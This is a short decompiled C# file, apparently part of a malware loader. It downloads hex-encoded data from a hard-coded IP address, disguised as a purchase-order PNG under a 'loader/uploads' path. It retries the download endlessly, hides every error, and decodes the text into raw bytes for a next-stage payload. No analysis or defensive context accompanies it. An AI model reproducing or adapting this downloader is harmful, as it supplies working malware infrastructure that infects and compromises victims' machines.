using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;

internal static class Class2
{
	internal static byte[] smethod_0()
	{
		return smethod_2(smethod_1("http://45.155.165.63/br1/loader/uploads/Purchase_Order-5910G_Kiefztwt.png"));
	}

	private static string smethod_1(string string_0)
	{
		try
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		}
		catch
		{
		}
		while (true)
		{
			try
			{
				StreamReader streamReader = new StreamReader(WebRequest.Create(string_0).GetResponse().GetResponseStream(), Encoding.UTF8);
				try
				{
					return streamReader.ReadToEnd();
				}
				finally
				{
					((IDisposable)streamReader).Dispose();
				}
			}
			catch
			{
			}
		}
	}

	private static byte[] smethod_2(string string_0)
	{
		string[] array = new string[256];
		Dictionary<string, byte> dictionary = new Dictionary<string, byte>();
		foreach (int item in Enumerable.Range(0, 256))
		{
			string text = (array[item] = ((byte)item).ToString("X2"));
			dictionary[text] = (byte)item;
			dictionary[text.ToLowerInvariant()] = (byte)item;
		}
		List<byte> list = new List<byte>();
		foreach (int item2 in Enumerable.Range(0, string_0.Length / 2))
		{
			list.Add(dictionary[string_0.Substring(item2 * 2, 2)]);
		}
		return list.ToArray();
	}
}
